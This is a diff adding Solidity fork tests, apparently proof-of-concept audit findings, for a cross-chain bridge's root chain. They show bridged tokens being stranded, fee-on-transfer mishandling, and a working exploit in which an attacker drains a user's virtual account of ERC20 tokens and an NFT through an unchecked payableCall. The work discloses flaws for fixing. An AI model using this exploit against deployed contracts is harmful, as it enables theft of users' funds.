@@ -2,6 +2,13 @@
 pragma solidity ^0.8.16;
 
 import "./helpers/RootForkHelper.t.sol";
+import {TransferFeeToken} from "./weird-tokens/TransferFeeToken.sol";
+import {DepositInput} from "../../src/interfaces/BridgeAgentStructs.sol";
+import {console2} from "forge-std/console2.sol";
+import {VirtualAccount, PayableCall} from "../../src/VirtualAccount.sol";
+import {IRootPort} from "../../src/interfaces/IRootPort.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+import {ERC721} from "solmate/tokens/ERC721.sol";
 
 pragma solidity ^0.8.0;
 
@@ -1816,9 +1823,8 @@ contract RootForkTest is LzForkTest {
         _amount %= type(uint128).max;
 
         vm.assume(
-            _user != address(0) && _user != address(arbitrumPort) && _user != address(rootPort)
-                && _amount > _deposit && _amount >= _amountOut && _amount - _amountOut >= _depositOut
-                && _depositOut < _amountOut
+            _user != address(0) && _user != address(arbitrumPort) && _user != address(rootPort) && _amount > _deposit
+                && _amount >= _amountOut && _amount - _amountOut >= _depositOut && _depositOut < _amountOut
         );
 
         //Set up
@@ -2949,10 +2955,436 @@ contract RootForkTest is LzForkTest {
 
         require(deposit.status == 0, "Deposit status should be succesful.");
     }
+
+    // @audit passed
+    function test_UserWillLostTokenWhenBridgeOut() public {
+        uint256 totalSupply = 100_000_000 ether; // 100 million tokens
+        address user = makeAddr("Bob");
+        uint256 userBalance = 1000 ether;
+
+        switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
+
+        // deploying new token on avax chain
+        // this will be our _underlying token
+        MockERC20 newToken = new MockERC20("TestToken", "TEST", 18);
+
+        // transfering some of this _underlying _tokne to user on fantom Chain
+        newToken.mint(user, userBalance);
+
+        // adding this new _underlying token to branch and root chain
+        _addLocalToken(address(newToken));
+
+        // making sure that we are on correct chain
+        switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
+
+        // bridging the token to the root
+        address receiverOnRoot = user;
+        uint256 bridgeOutAmount = 100 ether;
+        bytes memory payload = bytes("");
+        DepositInput memory depositInput = DepositInput({
+            hToken: address(ftmMockAssethToken), // local h token on branch chain
+            token: address(newToken), // underlying token
+            amount: bridgeOutAmount,
+            deposit: bridgeOutAmount
+        });
+
+        // transferring some ether to the user for gas payament
+        vm.deal(user, 20 ether);
+
+        // balances before deposit
+        uint256 userBalanceBefore = newToken.balanceOf(user);
+        uint256 branchPortBalanceBefore = newToken.balanceOf(address(ftmPort));
+
+        vm.startPrank(user);
+        // approving token for branch router
+        newToken.approve(address(ftmCoreRouter), bridgeOutAmount);
+
+        // call to bridge the tokens on root chain
+        ftmCoreRouter.callOutAndBridge{value: 20 ether}(payload, depositInput, GasParams(2_000_000, 0));
+
+        vm.stopPrank();
+
+        uint256 userBalanceAfter = newToken.balanceOf(user);
+        uint256 branchPortBalanceAfter = newToken.balanceOf(address(ftmPort));
+
+        // user should have sent bridged amount to the port
+        require(userBalanceBefore - userBalanceAfter == bridgeOutAmount, "invalid amount");
+
+        // branch port should get correct amount
+        console2.log("updated balance of branch port", branchPortBalanceAfter - branchPortBalanceBefore);
+        require(branchPortBalanceAfter - branchPortBalanceBefore == bridgeOutAmount, "invalid amount");
+
+        // switching to root chain to check we have correct balance
+        switchToLzChain(rootChainId);
+        uint256 userBalanceOfGlobalHToken = MockERC20(newFtmAssetGlobalAddress).balanceOf(user);
+        uint256 coreRootRouterBalanceOfGlobalHToken =
+            MockERC20(newFtmAssetGlobalAddress).balanceOf(address(coreRootRouter));
+
+        // all amount should be received by core Root router
+        require(coreRootRouterBalanceOfGlobalHToken == bridgeOutAmount, "invalid amount");
+
+        // user should have zero balance
+        require(userBalanceOfGlobalHToken == 0, "Don't lie! User got the amount");
+    }
+
+    // @audit passed
+
+    function test_FeeOnTransferTokenAreNotSupported() public {
+        uint256 fee = 10 ether;
+        uint256 totalSupply = 100_000_000 ether; // 100 million tokens
+        address user = makeAddr("Bob");
+        uint256 userBalance = 1000 ether;
+
+        switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
+
+        // deploying new transfer fee token on avax chain
+        // this will be our _underlying token
+        TransferFeeToken transferFeeToken = new TransferFeeToken(totalSupply, fee);
+
+        // transfering some of this _underlying _tokne to user and branch router on avax Chain
+        transferFeeToken.transfer(user, userBalance);
+        transferFeeToken.transfer(address(ftmCoreRouter), userBalance);
+
+        // adding this new _underlying token to branch and root chain
+        _addLocalToken(address(transferFeeToken));
+
+        // making sure that we are on correct chain
+        switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
+
+        // bridging the token to the root
+        address receiverOnRoot = user;
+        uint256 bridgeOutAmount = 100 ether;
+        bytes memory payload = bytes("");
+        DepositInput memory depositInput = DepositInput({
+            hToken: address(ftmMockAssethToken), // local h token on branch chain
+            token: address(transferFeeToken), // underlying token
+            amount: bridgeOutAmount,
+            deposit: bridgeOutAmount
+        });
+
+        // transferring some ether to the user for gas payament
+        vm.deal(user, 20 ether);
+
+        // balances before deposit
+        uint256 userBalanceBefore = transferFeeToken.balanceOf(user);
+        uint256 branchPortBalanceBefore = transferFeeToken.balanceOf(address(ftmPort));
+
+        vm.startPrank(user);
+        // approving token for branch router
+        transferFeeToken.approve(address(ftmCoreRouter), bridgeOutAmount);
+
+        // call to bridge the tokens on root chain
+        ftmCoreRouter.callOutAndBridge{value: 20 ether}(payload, depositInput, GasParams(2_000_000, 0));
+
+        vm.stopPrank();
+
+        uint256 userBalanceAfter = transferFeeToken.balanceOf(user);
+        uint256 branchPortBalanceAfter = transferFeeToken.balanceOf(address(ftmPort));
+
+        // user should have sent bridged amount to the port
+        require(userBalanceBefore - userBalanceAfter == bridgeOutAmount, "invalid amount");
+
+        // fee will be deducted twice since the token will be sent to branch router first and then to branch port
+        console2.log("updated balance of branch port", branchPortBalanceAfter - branchPortBalanceBefore);
+        require(branchPortBalanceAfter - branchPortBalanceBefore == (bridgeOutAmount - fee), "invalid amount");
+
+        // switching to root chain to check we have correct balance
+        switchToLzChain(rootChainId);
+        uint256 userBalanceOfGlobalHToken = MockERC20(newFtmAssetGlobalAddress).balanceOf(user);
+        uint256 coreRootRouterBalanceOfGlobalHToken =
+            MockERC20(newFtmAssetGlobalAddress).balanceOf(address(coreRootRouter));
+
+        require(coreRootRouterBalanceOfGlobalHToken == bridgeOutAmount, "invalid amount");
+    }
+
+    function _addLocalToken(address _token) public {
+        //Switch Chain and Execute Incoming Packets
+        switchToLzChain(ftmChainId);
+
+        vm.deal(address(this), 10 ether);
+
+        ftmCoreRouter.addLocalToken{value: 10 ether}(address(_token), GasParams(2_000_000, 0));
+
+        //Switch Chain and Execute Incoming Packets
+        switchToLzChain(rootChainId);
+
+        ftmMockAssethToken = rootPort.getLocalTokenFromUnderlying(address(_token), ftmChainId);
+
+        newFtmAssetGlobalAddress = rootPort.getGlobalTokenFromLocal(ftmMockAssethToken, ftmChainId);
+
+        console2.log("New Global: ", newFtmAssetGlobalAddress);
+        console2.log("New Local: ", ftmMockAssethToken);
+
+        require(
+            rootPort.getGlobalTokenFromLocal(ftmMockAssethToken, ftmChainId) == newFtmAssetGlobalAddress,
+            "Token should be added"
+        );
+        require(
+            rootPort.getLocalTokenFromGlobal(newFtmAssetGlobalAddress, ftmChainId) == ftmMockAssethToken,
+            "Token should be added"
+        );
+        require(
+            rootPort.getUnderlyingTokenFromLocal(ftmMockAssethToken, ftmChainId) == address(_token),
+            "Token should be added"
+        );
+    }
+
+    // @audit checking
+    function test_multipleDeposit() public {
+        // setup data
+        address user = makeAddr("Bob");
+        uint256 numberOftokensToAdd = 2;
+        uint8 tokenDecimals = 18;
+        uint256 userBalanceForTokens = 1000 ether;
+
+        // swithcing to chain for the test
+        switchToLzChainWithoutExecutePendingOrPacketUpdate(ftmChainId);
+        
+        // deploying new underlying tokens for testing purpose and adding it to the global chain
+        console2.log("starting Test");
+        _deployUnderlyingTokenAndAddToLocalMultiple(user,numberOftokensToAdd, tokenDecimals, userBalanceForTokens);
+        console2.log("Test Passed!");
+    }
+
+
+
+    function _deployUnderlyingTokenAndAddToLocalMultiple(address user,uint256 numberOftokensToAdd, uint8 tokenDecimals, uint256 tokenBalance ) public {
+        // deploying new mutlitiple tokens
+        // these tokens will be our _underlying tokens
+        MockERC20[] memory _tokens = new MockERC20[](numberOftokensToAdd);
+
+        console2.log("creating new underlying tokens...");
+        for(uint8 i; i<numberOftokensToAdd; i++){
+            _tokens[i] = new MockERC20(string.concat("Test Token ", vm.toString(i)), string.concat("TEST", vm.toString(i)), tokenDecimals);
+        }
+        console2.log("successfully created new underlying tokens");
+
+        // minting every created underlying token for the user
+        console2.log("minting to user %s tokens for adding to root chain...", tokenBalance);
+        vm.startPrank(user);
+        for(uint8 i; i<numberOftokensToAdd; i++){
+            _tokens[i].mint(user, tokenBalance);
+        }
+        vm.stopPrank();
+        console2.log("successfully minted the tokens to the user");
+        
+        //making sure we are on correct chain
+        switchToLzChain(ftmChainId);
+
+        console2.log("adding newly created tokens to the root chain...");
+        // adding multiple tokens to the root and branch ports
+        for (uint256 i; i < numberOftokensToAdd; i++) {
+            vm.deal(address(this), 10 ether);
+
+            ftmCoreRouter.addLocalToken{value: 10 ether}(address(_tokens[i]), GasParams(2_000_000, 0));
+        }
+        console2.log("successfully added token to the root chain");
+
+        //Switch Chain and Execute Incoming Packets
+        console2.log("switching to root chain for getting new created tokens...");
+        switchToLzChain(rootChainId);
+
+        // arrays to hold branch local tokens and root global tokens
+        address[] memory newLocalTokensOnBranch = new address[](_tokens.length);
+        address[] memory newGlobaltokensOnRoot = new address[](_tokens.length);
+
+        for (uint256 j; j < numberOftokensToAdd; j++) {
+            newLocalTokensOnBranch[j] = rootPort.getLocalTokenFromUnderlying(address(_tokens[j]), ftmChainId);
+
+            newGlobaltokensOnRoot[j] = rootPort.getGlobalTokenFromLocal(newLocalTokensOnBranch[j], ftmChainId);
+
+            console2.log("New Global: ", newGlobaltokensOnRoot[j]);
+            console2.log("New Local: ", newLocalTokensOnBranch[j]);
+
+            require(
+                rootPort.getGlobalTokenFromLocal(newLocalTokensOnBranch[j], ftmChainId) == newGlobaltokensOnRoot[j],
+                "Token should be added"
+            );
+            require(
+                rootPort.getLocalTokenFromGlobal(newGlobaltokensOnRoot[j], ftmChainId) == newLocalTokensOnBranch[j],
+                "Token should be added"
+            );
+            require(
+                rootPort.getUnderlyingTokenFromLocal(newLocalTokensOnBranch[j], ftmChainId) == address(_tokens[j]),
+                "Token should be added"
+            );
+        }
+
+        console2.log("switching to Fantom chain again...");
+        switchToLzChain(ftmChainId);
+        // creating data for bridgeout
+        address[] memory tokenAddresses = new address[](numberOftokensToAdd); 
+        uint256[] memory bridgeOutAmount = new uint256[](numberOftokensToAdd);
+        for(uint8 i; i<numberOftokensToAdd; i++){
+            tokenAddresses[i] = address(_tokens[i]);
+            bridgeOutAmount[i] = tokenBalance;
+        }
+
+        // bridging out all of the tokens
+        DepositMultipleInput memory depositInput = DepositMultipleInput({
+            hTokens: newLocalTokensOnBranch, // local h tokens on branch chain
+            tokens: tokenAddresses, // underlying tokens
+            amounts: bridgeOutAmount,
+            deposits: bridgeOutAmount
+        });
+
+        // making sure user has enough eth for the call
+        vm.deal(user, 30 ether);
+
+        console2.log("user bridging out the underlying tokens to the root chain...");
+        vm.startPrank(user);
+        _bridgeOutMultipleTokens(tokenAddresses, depositInput, tokenBalance);
+        vm.stopPrank();
+        console2.log("successfully bridged out tokens!");
+
+        // switch to root for checking balances
+        switchToLzChain(rootChainId);
+
+        console2.log("checking if everyone got the correct balance");
+        _checkBalancesAfterBridgeOut(user, tokenBalance, newGlobaltokensOnRoot);
+    }
+
+    function _checkBalancesAfterBridgeOut(address user, uint256 tokenBalance, address[] memory newGlobaltokensOnRoot) internal{
+        uint256[] memory userBalancesOfGlobalTokens = new uint256[](newGlobaltokensOnRoot.length);
+        uint256[] memory coreRootRouterBalancesOfGlobalTokens = new uint256[](newGlobaltokensOnRoot.length);
+
+        for(uint8 i; i<newGlobaltokensOnRoot.length; i++){
+            userBalancesOfGlobalTokens[i] = MockERC20(newGlobaltokensOnRoot[i]).balanceOf(user);
+            coreRootRouterBalancesOfGlobalTokens[i] = MockERC20(newGlobaltokensOnRoot[i]).balanceOf(address(coreRootRouter));
+
+            // proof that all tokens went to core root router instead of user. There ain't a way to 
+            // withdraw these tokens by the user.
+            require(coreRootRouterBalancesOfGlobalTokens[i] == tokenBalance, "invalid balance");
+            require(userBalancesOfGlobalTokens[i] == 0, "invalid balance");
+        }
+
+        console2.log("Balances checked");
+    }
+
+    function _bridgeOutMultipleTokens(
+        address[] memory tokens,
+        DepositMultipleInput memory depositInput,
+        uint256 tokenBalance
+    ) internal {
+        // approving tokens for branch router
+        for (uint256 i; i < tokens.length; i++) {
+            MockERC20(tokens[i]).approve(address(ftmCoreRouter), tokenBalance);
+        }
+
+        // // call to bridge the tokens on root chain
+        ftmCoreRouter.callOutAndBridgeMultiple{value: 20 ether}(bytes(""), depositInput, GasParams(2_000_000, 0));
+    }
+
+    // @audit passed
+    function test_AnyoneCanCallPayableCallFunctionToTakeOutVirtualAccountFundsWithoutSendingItAnyEther() public {
+        // setup
+        switchToLzChain(rootChainId);
+        address user = makeAddr("Alice");
+        address attacker = makeAddr("Attacker");
+        uint256 userTokenAmount = 100 ether;
+
+        // deploying new ERC20 token and ERC721 NFT
+        MockERC20 newToken = new MockERC20("Test token", "TEST", 18);
+        // NOTE: this is very simplified version of nft. the actual Uniswap nft could be more
+        // complex and might have minting and transfer condition. this is just for the testing purpose
+        UniV3NFT newNFTToken = new UniV3NFT("Test NFT", "TEST");
+
+        // creating new account for the user
+        VirtualAccount account = rootPort.fetchVirtualAccount(user);
+
+        // checking if created account is valid
+        require(account.userAddress() == user, "invalid user");
+        require(account.localPortAddress() == address(rootPort), "invalid local port");
+
+        // transferring some token to the user so that he can deposit in virtual account
+        newToken.mint(user, userTokenAmount);
+
+        vm.startPrank(user);
+        // user transfer all of his tokens to the virtual account
+        newToken.transfer(address(account), userTokenAmount);
+
+        // user mint new NFT
+        uint256 tokenId = newNFTToken.mint(user);
+
+        // user transfer the new NFT to the virtual account
+        newNFTToken.transferFrom(user, address(account), tokenId);
+        vm.stopPrank();
+
+        // getting virtual account balance
+        uint256 virtualAccountBalance = MockERC20(newToken).balanceOf(address(account));
+        uint256 userBalance = MockERC20(newToken).balanceOf(user);
+
+        // checking if virtual account has got all the tokens of user
+        require(virtualAccountBalance == userTokenAmount, "invalid balance of virtual account");
+        require(userBalance == 0, "invalid balance of user");
+
+        // attakcer sees that the virtual account has balance start preparing call data
+        vm.startPrank(attacker);
+        PayableCall[] memory calls = new PayableCall[](2);
+
+        // attacker use payableCall function to approve himself for the tokens by the virtual account
+        // also he didn't need to transfer any ether to the virtual account as the function didn't
+        // check that as well
+        calls[0] = PayableCall({
+            target: address(newToken),
+            callData: abi.encodeWithSelector(ERC20.approve.selector, attacker, userTokenAmount),
+            value: 0
+        });
+
+        // calldata to transfer the nft
+        calls[1] = PayableCall({
+            target: address(newNFTToken),
+            callData: abi.encodeWithSelector(ERC20.transferFrom.selector, address(account), attacker, tokenId),
+            value: 0
+        });
+
+        // performing call
+        VirtualAccount(payable(address(account))).payableCall(calls);
+
+        // getting balances before the transfer
+        uint256 attackerBalanceBefore = newToken.balanceOf(attacker);
+        uint256 virtualAccountBalanceBefore = newToken.balanceOf(address(account));
+
+        // attacker transfer token to himself leaving virtual account empty
+        newToken.transferFrom(address(account), attacker, userTokenAmount);
+        vm.stopPrank();
+
+        // getting balances after the transfer
+        uint256 attackerBalanceAfter = newToken.balanceOf(attacker);
+        uint256 virtualAccountBalanceAfter = newToken.balanceOf(address(account));
+
+        // attacker should not have anything before the call
+        require(attackerBalanceBefore == 0, "invalid amount");
+
+        // attaker should have all the userTokens after the call
+        require(attackerBalanceAfter - attackerBalanceBefore == userTokenAmount, "Nope you didn't get anything looser!");
+
+        // virtual account balance before the transfer should be equal to transferred token by the user
+        require(virtualAccountBalanceBefore == userTokenAmount, "invalid amount");
+
+        // virtual account should not have anything after the transfer
+        require(virtualAccountBalanceAfter == 0, "I still got the amount");
+        require(newNFTToken.ownerOf(tokenId) == attacker, "No you are not");
+    }
 }
 
 contract MockPortStartegy {
     function withdraw(address port, address token, uint256 amount) public {
         MockERC20(token).transfer(port, amount);
+    }
+}
+
+contract UniV3NFT is ERC721 {
+    uint256 public tokenId;
+
+    constructor(string memory name, string memory symbol) ERC721(name, symbol) {}
+
+    function mint(address to) public returns (uint256 id) {
+        id = tokenId++;
+        _safeMint(to, id);
+    }
+
+    function tokenURI(uint256 id) public view override returns (string memory) {
+        return "ipfs:://IpfsCidForTheUniswapV3NFT";
     }
 }
